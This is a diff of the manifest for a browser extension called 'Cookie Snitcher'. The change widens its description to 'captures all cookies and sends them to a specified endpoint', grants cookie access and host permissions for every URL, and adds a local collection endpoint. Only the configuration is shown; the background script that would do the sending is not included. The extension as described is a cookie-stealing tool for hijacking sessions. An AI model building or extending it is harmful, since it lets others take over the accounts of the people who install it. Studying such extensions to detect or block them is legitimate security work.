@@ -2,21 +2,20 @@
   "manifest_version": 3,
   "name": "Cookie Snitcher",
   "version": "1.0",
-  "description": "Captures cookies from the active tab and sends them to a backend.",
+  "description": "Captures all cookies and sends them to a specified endpoint.",
   "permissions": [
     "cookies",
-    "activeTab",
-    "storage"
+    "alarms"
+  ],
+  "host_permissions": [
+    "http://localhost:3000/api/cookies",
+    "<all_urls>"
   ],
   "background": {
     "service_worker": "background.js"
   },
-  "icons": {
-    "16": "icon.png",
-    "48": "icon.png",
-    "128": "icon.png"
-  },
-  "host_permissions": [
-    "<all_urls>"
-  ]
+  "action": {
+    "default_popup": "popup.html",
+    "default_title": "Cookie Snitcher"
+  }
 }
